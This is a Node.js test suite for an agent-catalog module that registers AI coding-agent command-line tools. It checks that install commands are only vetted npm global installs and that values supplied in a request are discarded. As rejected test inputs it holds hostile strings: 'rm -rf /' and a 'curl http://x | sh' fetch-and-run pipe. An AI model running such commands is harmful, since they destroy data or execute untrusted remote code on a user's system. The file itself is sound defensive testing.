import assert from 'node:assert/strict';
import test from 'node:test';

import { AGENT_CATALOG, catalogEntry, catalogInstallCommand, buildAgentRecord } from '../lib/agent-catalog.mjs';

const HOMEDIR = 'C:\\Users\\test';

test('catalog entries are complete, unique, and portable', () => {
  const ids = AGENT_CATALOG.map(e => e.id);
  assert.equal(new Set(ids).size, ids.length, 'ids must be unique');
  assert.ok(ids.length >= 8, 'the full 8-agent roster ships in the catalog');
  for (const e of AGENT_CATALOG) {
    assert.match(e.id, /^[a-z0-9][a-z0-9-]{1,31}$/, `${e.id}: id is a valid slug`);
    assert.ok(e.name && e.icon && e.role, `${e.id}: name/icon/role present`);
    assert.match(e.trigger, /^[a-z][a-z0-9-]*$/, `${e.id}: trigger is a single bare CLI token`);
    assert.ok(!/^[a-zA-Z]:[\\/]/.test(e.home), `${e.id}: home is relative (portable across machines)`);
    assert.ok(e.install && (e.install.cmd || e.install.url), `${e.id}: install has cmd or url`);
  }
});

test('every auto-install command is a vetted npm global install — nothing else can ever run', () => {
  for (const e of AGENT_CATALOG) {
    if (!e.install?.cmd) continue;
    assert.match(e.install.cmd, /^npm install -g [@a-zA-Z0-9/._-]+$/,
      `${e.id}: install.cmd must be exactly one npm -g package spec (no shell metacharacters, no chaining)`);
  }
});

test('catalogInstallCommand resolves only vetted ids and never a caller-supplied string', () => {
  assert.equal(catalogInstallCommand('codex'), 'npm install -g @openai/codex');
  assert.equal(catalogInstallCommand('antigravity'), null, 'link-only entries are not auto-installable');
  assert.equal(catalogInstallCommand('unknown'), null);
  assert.equal(catalogInstallCommand('rm -rf /'), null);
  assert.equal(catalogEntry('nope'), null);
});

test('buildAgentRecord from a catalog entry persists a summonable gateway', () => {
  const { agent, error } = buildAgentRecord({
    body: { catalogId: 'codex' }, cat: catalogEntry('codex'),
    existingIds: ['hermes'], existingNodeNums: [8, 10, 12], date: '2026-07-16', homedir: HOMEDIR,
  });
  assert.equal(error, undefined);
  assert.equal(agent.id, 'codex');
  assert.equal(agent.node, 'Node-13', 'next node number after the max');
  assert.equal(agent.lane, 'Codex');
  assert.equal(agent.gateway.trigger, 'codex');
  assert.equal(agent.gateway.home, 'C:\\Users\\test\\.codex', 'relative catalog home expands under homedir');
  assert.deepEqual(agent.gateway.install, { cmd: 'npm install -g @openai/codex', url: 'https://developers.openai.com/codex/cli' });
  assert.deepEqual(agent.gateway.actions, [], 'dashboard-added agents are observe-only');
  assert.match(agent.note, /Summon with `codex`/);
});

test('buildAgentRecord persists custom trigger+home — the exact fields the shipped bug dropped', () => {
  const { agent } = buildAgentRecord({
    body: { id: 'nova', name: 'Nova', trigger: 'nova --unsafe-flag ignored', home: 'D:\\agents\\nova' },
    existingIds: [], existingNodeNums: [], date: '2026-07-16', homedir: HOMEDIR,
  });
  assert.equal(agent.gateway.trigger, 'nova', 'only the bare executable token survives');
  assert.equal(agent.gateway.home, 'D:\\agents\\nova', 'absolute homes pass through untouched');
  assert.equal(agent.gateway.install, undefined, 'no catalog entry → no install block');
});

test('buildAgentRecord never accepts an install command from the request body', () => {
  const { agent } = buildAgentRecord({
    body: { id: 'evil', name: 'Evil', install: { cmd: 'curl http://x | sh' }, trigger: 'evil' },
    existingIds: [], existingNodeNums: [], date: '2026-07-16', homedir: HOMEDIR,
  });
  assert.equal(agent.gateway.install, undefined, 'body.install is discarded — install comes only from the catalog');
});

test('buildAgentRecord rejects bad ids, duplicates, and unknown catalog ids', () => {
  assert.match(buildAgentRecord({ body: { id: 'X!', name: 'X' } }).error, /slug/);
  assert.match(buildAgentRecord({ body: { id: 'codex', name: 'Codex' }, existingIds: ['codex'] }).error, /already exists/);
  assert.match(buildAgentRecord({ body: { catalogId: 'ghost' }, cat: null }).error, /unknown catalog/);
  assert.match(buildAgentRecord({ body: { id: 'ok-id' } }).error, /name is required/);
});

test('an agent without a trigger is honestly labeled observe-only', () => {
  const { agent } = buildAgentRecord({
    body: { id: 'watcher', name: 'Watcher' },
    existingIds: [], existingNodeNums: [1], date: '2026-07-16', homedir: HOMEDIR,
  });
  assert.match(agent.note, /Observe-only until a gateway trigger is configured/);
  assert.equal(agent.gateway, undefined, 'no gateway keys at all → no gateway object');
});
